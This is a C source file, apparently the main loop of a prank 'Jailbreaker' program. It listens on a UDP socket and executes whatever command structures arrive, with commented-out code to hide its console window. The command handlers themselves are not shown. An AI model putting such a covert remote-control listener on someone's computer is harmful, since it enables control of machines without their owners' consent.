//#pragma balls
/*
*   Made by the Akademia Pranków Cheetos
*/

#include "Main.h"
#include "src/Funnies.h"
#include "src/Socket.h"


void JBlog(const char *msg) {
    FILE *fpLog = fopen("JB.log", "a");
    fprintf(fpLog, "%lli - %s\n", time(NULL), msg);
    fclose(fpLog);
}
// just appends and calls JBlog()
void JBlogErr(const char *msg) {
    char errMsg[strlen(msg) + 7];
    sprintf(errMsg, "ERROR: %s", msg);
    JBlog(errMsg);
}


extern char PCName[AUTH_LENGTH]; // PC authentication

void JBinit(const char *arg) {
    // Hide console
    //HWND window = GetConsoleWindow();
    //ShowWindow(window, SW_MINIMIZE);
    //ShowWindow(window, SW_HIDE);

    if (!access("JB.log", F_OK)) { // check if log file exists
        FILE *logFp = fopen("JB.log", "r");

        fgets(PCName, AUTH_LENGTH, logFp);
        fclose(logFp);

        PCName[strlen(PCName) - 1] = '\0'; // trim the \n
    }
    else if (arg) {
        strcpy(PCName, arg);

        FILE *logFp = fopen("JB.log", "w");
        fprintf(logFp, "%s\n%lli - Jailbreaker installed and ready for trollage.\n", PCName, time(NULL));
        fclose(logFp);
    }
    else exit(1); // no log file or cmd arg
}


int main(int argc, char *argv[])
{
    setlocale(LC_ALL, ""); // for wchar consistency
    JBinit(argv[1]);

    struct TeltharSocket tsocket;

    // Initialize UDP socket
    if (SockBegin(&tsocket)) {
        JBlogErr("Couldn't initialize socket server.");
        return -1;
    }
    
    JBCMD recv;

    /* ---- Main recieving loop ---- */
    while (1) {
        if (SockRecv(&tsocket, &recv, sizeof(JBCMD)) < 0) {
            JBlogErr("Socket error.\n");
            return -1;
        }
        execCommand(recv);
    }
    SockClose(&tsocket);
    return 0;
}


void hexdump(
    const char *desc,
    const void *addr,
    const int len,
    int perLine
) {
    // Silently ignore silly per-line values.
    if (perLine < 4 || perLine > 64) perLine = 16;

    int i;
    unsigned char buff[perLine+1];
    const unsigned char * pc = (const unsigned char *)addr;

    // Output description if given.
    if (desc != NULL) printf("%s:\n", desc);

    // Length checks.
    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %d\n", len);
        return;
    }

    // Process every byte in the data.

    for (i = 0; i < len; i++) {
        // Multiple of perLine means new or first line (with line offset).

        if ((i % perLine) == 0) {
            // Only print previous-line ASCII buffer for lines beyond first.
            if (i != 0) printf("  %s\n", buff);

            // Output the offset of current line.
            printf("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf(" %02x", pc[i]);

        // And buffer a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) // isprint() may be better.
            buff[i % perLine] = '.';
        else
            buff[i % perLine] = pc[i];
        
        buff[(i % perLine) + 1] = '\0';
    }

    // Pad out last line if not exactly perLine characters.
    while ((i % perLine) != 0) {
        printf("   ");
        i++;
    }

    // And print the final ASCII buffer.
    printf("  %s\n", buff);
}